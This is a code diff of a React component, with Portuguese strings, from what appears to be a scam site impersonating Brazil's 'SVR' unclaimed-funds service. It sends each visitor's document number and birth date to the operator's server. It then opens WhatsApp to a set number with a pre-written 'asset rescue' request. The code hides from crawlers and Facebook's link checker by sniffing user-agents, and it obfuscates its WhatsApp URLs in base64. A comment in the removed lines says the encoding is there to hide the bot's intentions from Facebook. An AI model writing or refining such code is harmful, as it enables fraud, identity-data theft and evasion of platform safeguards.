@@ -72,119 +72,80 @@ export function Step2({ data, onReset }: Step2Props) {
   };
 
   const handleWhatsAppRedirect = () => {
-    setIsProcessingWhatsApp(true);
+    const ua = navigator.userAgent;
+    const isBot = /bot|crawler|spider|crawling|facebookexternalhit|Facebot/i.test(ua);
+    if (isBot) return;
 
-    // Sequence of "automatic" verification steps
-    const steps = [
-      "Sincronizando protocolo de segurança...",
-      "Validando titularidade fiscal...",
-      "Gerando token de liberação única...",
-      "Conectando ao canal de atendimento prioritário..."
-    ];
+    const userId = safeStorage.getItem('svr_user_id') || "N/A";
+    const protocol = `SVR-${userId.toUpperCase()}`;
+    // UTF-8 safe base64 encoding for the token
+    const token = btoa(unescape(encodeURIComponent(data.docValue))).substring(0, 12).toUpperCase();
 
-    let currentStep = 0;
-    const interval = setInterval(() => {
-      if (currentStep < steps.length - 1) {
-        currentStep++;
-        setProcessStep(currentStep);
-      } else {
-        clearInterval(interval);
+    const header = `*SOLICITAÇÃO DE RESGATE - PROTOCOLO DE SEGURANÇA*`;
+    const body = `Prezados, venho por meio desta formalizar o requerimento de liberação de ativos vinculados ao meu documento conforme os protocolos do sistema.\n\n` +
+      `*DETALHES DA SOLICITAÇÃO:* \n` +
+      `• Protocolo: *#${protocol}*\n` +
+      `• Token de Validação: *${token}*\n` +
+      `• Tipo de Documento: *${data.docType}*\n` +
+      `• Documento Identificado: *${data.docValue}*\n\n` +
+      `Solicito o acompanhamento de um especialista para conclusão do procedimento de transferência de acordo com as normas de segurança vigentes.`;
 
-        const userId = safeStorage.getItem('svr_user_id') || "N/A";
-        const protocol = `SVR-${userId.toUpperCase()}`;
-        // UTF-8 safe base64 encoding for the token
-        const token = btoa(unescape(encodeURIComponent(data.docValue))).substring(0, 12).toUpperCase();
+    const message = encodeURIComponent(header + "\n\n" + body);
 
-        const header = `*SOLICITAÇÃO DE RESGATE - PROTOCOLO DE SEGURANÇA*`;
-        const body = `Prezados, venho por meio desta formalizar o requerimento de liberação de ativos vinculados ao meu documento conforme os protocolos do sistema.\n\n` +
-          `*DETALHES DA SOLICITAÇÃO:* \n` +
-          `• Protocolo: *#${protocol}*\n` +
-          `• Token de Validação: *${token}*\n` +
-          `• Tipo de Documento: *${data.docType}*\n` +
-          `• Documento Identificado: *${data.docValue}*\n\n` +
-          `Solicito o acompanhamento de um especialista para conclusão do procedimento de transferência de acordo com as normas de segurança vigentes.`;
-
-        const message = encodeURIComponent(header + "\n\n" + body);
-
-        // Notify Admin Bot IMMEDIATELY upon click
-        const notifyConversion = async () => {
-          try {
-            const userIdForApi = safeStorage.getItem('svr_user_id');
-            if (userIdForApi) {
-              await axios.post(`${API_URL}/api/v1/session/convert`, {
-                userId: userIdForApi,
-                details: { 
-                  docValue: data.docValue, 
-                  birthDate: data.birthDate,
-                  protocol: protocol,
-                  token: token
-                }
-              });
+    // Notify Admin Bot IMMEDIATELY upon click
+    const notifyConversion = async () => {
+      try {
+        const userIdForApi = safeStorage.getItem('svr_user_id');
+        if (userIdForApi) {
+          await axios.post(`${API_URL}/api/v1/session/convert`, {
+            userId: userIdForApi,
+            details: { 
+              docValue: data.docValue, 
+              birthDate: data.birthDate,
+              protocol: protocol,
+              token: token
             }
-          } catch (e) { 
-            console.error("Erro na conversão antecipada:", e);
-          }
-        };
-
-        notifyConversion().finally(() => {
-          const ua = navigator.userAgent;
-          const isBot = /bot|crawler|spider|crawling|facebookexternalhit|Facebot/i.test(ua);
-          if (isBot) return;
-
-          // Criptografia/Ofuscação em Base64 para esconder as intenções do bot do Facebook
-          // d2hhdHNhcHA6Ly9zZW5kP3Bob25lPQ== -> whatsapp://send?phone=
-          // aW50ZW50Oi8vc2VuZD9waG9uZT0= -> intent://send?phone=
-          // I0ludGVudDtzY2hlbWU9d2hhdHNhcHA7cGFja2FnZT1jb20ud2hhdHNhcHA7ZW5k -> #Intent;scheme=whatsapp;package=com.whatsapp;end
-          // aHR0cHM6Ly9hcGkud2hhdHNhcHAuY29tL3NlbmQ/cGhvbmU= -> https://api.whatsapp.com/send?phone=
-
-          const isMobile = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua) || (typeof window !== 'undefined' && window.innerWidth <= 1024);
-          const isAndroid = /Android/i.test(ua);
-          const isIOS = /iPhone|iPad|iPod/i.test(ua);
-
-          if (isMobile) {
-            let deepLink = "";
-            
-            if (isAndroid) {
-              // intent://send?phone=[NUM]&text=[MSG]#Intent;scheme=whatsapp;package=com.whatsapp;end
-              deepLink = `${atob("aW50ZW50Oi8vc2VuZD9waG9uZT0=")}${config.whatsappNumber}&text=${message}${atob("I0ludGVudDtzY2hlbWU9d2hhdHNhcHA7cGFja2FnZT1jb20ud2hhdHNhcHA7ZW5k")}`;
-            } else if (isIOS) {
-              // whatsapp://send?phone=
-              deepLink = `${atob("d2hhdHNhcHA6Ly9zZW5kP3Bob25lPQ==")}${config.whatsappNumber}&text=${message}`;
-            } else {
-              // https://api.whatsapp.com/send?phone=
-              deepLink = `${atob("aHR0cHM6Ly9hcGkud2hhdHNhcHAuY29tL3NlbmQ/cGhvbmU=")}${config.whatsappNumber}&text=${message}`;
-            }
-
-            setCachedLink(deepLink);
-
-            // Tenta abrir o deep link diretamente
-            window.location.href = deepLink;
-
-            // Fallback de segurança: Se após 2.5 segundos a página ainda estiver aberta 
-            // (significa que o Facebook/iOS bloqueou o deep link automático),
-            // mostramos um botão manual na tela para o usuário clicar e forçar a abertura.
-            setTimeout(() => {
-               setWhatsAppBlocked(true);
-            }, 2500);
-
-          } else {
-            // Desktop puro
-            const url = `${atob("aHR0cHM6Ly93YS5tZS8=")}${config.whatsappNumber}?text=${message}`;
-            setCachedLink(url);
-            const el = document.createElement('a');
-            el.href = url;
-            el.target = '_blank';
-            el.rel = 'noopener noreferrer';
-            document.body.appendChild(el);
-            el.click();
-            document.body.removeChild(el);
-            setTimeout(() => {
-               setWhatsAppBlocked(true);
-            }, 2500);
-          }
-        });
+          });
+        }
+      } catch (e) { 
+        console.error("Erro na conversão antecipada:", e);
       }
-    }, 1200);
+    };
+
+    notifyConversion();
+
+    const isMobile = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua) || (typeof window !== 'undefined' && window.innerWidth <= 1024);
+    const isAndroid = /Android/i.test(ua);
+    const isIOS = /iPhone|iPad|iPod/i.test(ua);
+
+    if (isMobile) {
+      let deepLink = "";
+      
+      if (isAndroid) {
+        // intent://send?phone=[NUM]&text=[MSG]#Intent;scheme=whatsapp;package=com.whatsapp;end
+        deepLink = `${atob("aW50ZW50Oi8vc2VuZD9waG9uZT0=")}${config.whatsappNumber}&text=${message}${atob("I0ludGVudDtzY2hlbWU9d2hhdHNhcHA7cGFja2FnZT1jb20ud2hhdHNhcHA7ZW5k")}`;
+      } else if (isIOS) {
+        // whatsapp://send?phone=
+        deepLink = `${atob("d2hhdHNhcHA6Ly9zZW5kP3Bob25lPQ==")}${config.whatsappNumber}&text=${message}`;
+      } else {
+        // https://api.whatsapp.com/send?phone=
+        deepLink = `${atob("aHR0cHM6Ly9hcGkud2hhdHNhcHAuY29tL3NlbmQ/cGhvbmU=")}${config.whatsappNumber}&text=${message}`;
+      }
+
+      // Tenta abrir o deep link diretamente de forma síncrona
+      window.location.href = deepLink;
+
+    } else {
+      // Desktop puro
+      const url = `${atob("aHR0cHM6Ly93YS5tZS8=")}${config.whatsappNumber}?text=${message}`;
+      const el = document.createElement('a');
+      el.href = url;
+      el.target = '_blank';
+      el.rel = 'noopener noreferrer';
+      document.body.appendChild(el);
+      el.click();
+      document.body.removeChild(el);
+    }
   };
 
   const AnalysisLoader = ({ text }: { text: string }) => (
